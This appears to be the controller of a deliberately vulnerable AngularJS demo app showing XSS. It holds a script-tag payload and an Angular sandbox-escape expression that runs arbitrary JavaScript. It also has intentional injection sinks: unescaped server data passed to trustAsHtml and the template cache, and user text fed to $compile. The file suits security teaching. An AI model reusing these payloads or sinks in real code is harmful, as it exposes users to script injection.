'use strict'

angular.module('XSSAngularApp', [])
	.controller('MainCtrl', function($scope, $http, $compile, $timeout, $templateCache, $sce, $window, ResizeAndScrollService){
		var resizeAndScrollService = new ResizeAndScrollService($scope);
		$window.hackMessage = 'You have been hacked!';

		$scope.hackScriptText = '<script type="text/javascript">alert("You have been hacked!"); document.body.firstElementChild.className = 1;</script>';
		$scope.hackSandBoxText = "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(hackMessage); document.body.firstElementChild.className = 1')()}}";

		$scope.a1Items = [];
		$scope.hacked = document.getElementById('dummy-hacked-indicator').className === '1';

		$http.get('/getDB').then(function(res){
			var obj = res.data;
			$scope.serverTemplateUnparsedText = obj.serverTemplateUnparsedText;
			$scope.interpolationText = obj.interpolationText;
			$scope.ngIncludeText = obj.ngIncludeText;
			$scope.ngBindHtmlText = obj.ngBindHtmlText;
			$templateCache.put('htmlContentUrl', '<div id="' + $scope.ngIncludeText + '"></div>');
			$scope.loadedDB = true;
		});

		$scope.cleanDBPlusRefresh = function(){
			$http.post('/cleanDB').then(function(){
				$window.location.reload();
			});
		};

		$scope.onNgIncludeComplete = function() {
			$scope.ngIncludeCompiled = angular.element('#angular-2 .compiled')[0].innerHTML;
		};
		
		$scope.createElement = function() {
			var element = document.createElement('div');
			element.className = $scope.constructionText;
			angular.element('#construction-text-container').append(element);
			$scope.hacked = $scope.constructionText === $scope.hackSandBoxText;
			$compile(element)($scope);
			$scope.a1Items.push(element.outerHTML);
		};

		$scope.$watch('ngBindHtmlText', function(newVal){
			$scope.ngBindHtmlFull = $sce.trustAsHtml('<div id="' + newVal + '"></div>');
		});

		$scope.startTimer = function() {
			$timeout(function(){
				if($scope.statusMessage) {
					$scope.statusMessage = '';
				}
			}, 5000);
		};

		var unbindScrollWatcher = $scope.$watch(function(){
			return angular.isDefined($scope.ngIncludeCompiled) && angular.isDefined($scope.ngBindHtmlFull);
		}, function(newVal) {
			if(newVal) {
				$timeout(function(){
					resizeAndScrollService.scrollToLastScrollTop();
					unbindScrollWatcher();
				});
			}
		});

		resizeAndScrollService.bindScrollHander();
		resizeAndScrollService.bindResizeHandlerAndExecute();
	});
	
	